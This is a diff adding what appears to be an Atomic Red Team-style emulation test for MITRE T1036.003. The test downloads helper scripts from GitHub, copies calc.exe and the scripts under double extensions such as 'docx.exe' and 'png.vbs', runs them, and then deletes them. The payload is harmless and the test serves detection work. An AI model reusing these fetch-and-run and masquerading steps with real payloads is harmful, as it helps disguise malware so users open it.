@@ -1,0 +1,75 @@
+api_version: "2.0"
+name: File Extension Masquerading
+description: |
+    download and execute a file masquerading as images or Office files. Upon execution 3 calc instances and 3 vbs windows will be launched.
+
+    e.g SOME_LEGIT_NAME.[doc,docx,xls,xlsx,pdf,rtf,png,jpg,etc.].[exe,vbs,js,ps1,etc] (Quartelyreport.docx.exe)
+args:
+    - name: exe_path
+      type: path
+      default: C:\Windows\System32\calc.exe
+    - name: vbs_path
+      type: path
+      default: PathToAtomicsFolder\T1036.003\src\T1036.003_masquerading.vbs
+    - name: ps1_path
+      type: path
+      default: PathToAtomicsFolder\T1036.003\src\T1036.003_masquerading.ps1
+uuid: c7fa0c3b-b57f-4cba-9118-863bf4e653fc
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1036: Masquerading'
+    subtechniques:
+        - 'T1036.003: Rename System Utilities'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        File to copy must exist on disk at specified location (#{vbs_path})
+      inline: |
+        if (Test-Path "#{vbs_path}") {exit 0} else {{New-Item -Type Directory (split-path "#{vbs_path}") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/src/T1036.003_masquerading.vbs" -OutFile "#{vbs_path}"
+        }}
+      executor: powershell
+    - name: |
+        File to copy must exist on disk at specified location (#{ps1_path})
+      inline: |
+        if (Test-Path "#{ps1_path}") {exit 0} else {{New-Item -Type Directory (split-path "#{ps1_path}") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/src/T1036.003_masquerading.ps1" -OutFile "#{ps1_path}"
+        }}
+      executor: powershell
+    - name: file-extension-masquerading
+      inline: |
+        copy "{{.Args.exe_path}}" %temp%\T1036.003_masquerading.docx.exe /Y
+        copy "{{.Args.exe_path}}" %temp%\T1036.003_masquerading.pdf.exe /Y
+        copy "{{.Args.exe_path}}" %temp%\T1036.003_masquerading.ps1.exe /Y
+        copy "{{.Args.vbs_path}}" %temp%\T1036.003_masquerading.xls.vbs /Y
+        copy "{{.Args.vbs_path}}" %temp%\T1036.003_masquerading.xlsx.vbs /Y
+        copy "{{.Args.vbs_path}}" %temp%\T1036.003_masquerading.png.vbs /Y
+        copy "{{.Args.ps1_path}}" %temp%\T1036.003_masquerading.doc.ps1 /Y
+        copy "{{.Args.ps1_path}}" %temp%\T1036.003_masquerading.pdf.ps1 /Y
+        copy "{{.Args.ps1_path}}" %temp%\T1036.003_masquerading.rtf.ps1 /Y
+        %temp%\T1036.003_masquerading.docx.exe
+        %temp%\T1036.003_masquerading.pdf.exe
+        %temp%\T1036.003_masquerading.ps1.exe
+        %temp%\T1036.003_masquerading.xls.vbs
+        %temp%\T1036.003_masquerading.xlsx.vbs
+        %temp%\T1036.003_masquerading.png.vbs
+        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.doc.ps1
+        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.pdf.ps1
+        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.rtf.ps1
+      executor: command_prompt
+      cleanup:
+        inline: |
+            del /f %temp%\T1036.003_masquerading.docx.exe > nul 2>&1
+            del /f %temp%\T1036.003_masquerading.pdf.exe > nul 2>&1
+            del /f %temp%\T1036.003_masquerading.ps1.exe > nul 2>&1
+            del /f %temp%\T1036.003_masquerading.xls.vbs > nul 2>&1
+            del /f %temp%\T1036.003_masquerading.xlsx.vbs > nul 2>&1
+            del /f %temp%\T1036.003_masquerading.png.vbs > nul 2>&1
+            del /f %temp%\T1036.003_masquerading.doc.ps1 > nul 2>&1
+            del /f %temp%\T1036.003_masquerading.pdf.ps1 > nul 2>&1
+            del /f %temp%\T1036.003_masquerading.rtf.ps1 > nul 2>&1
+        executor: command_prompt
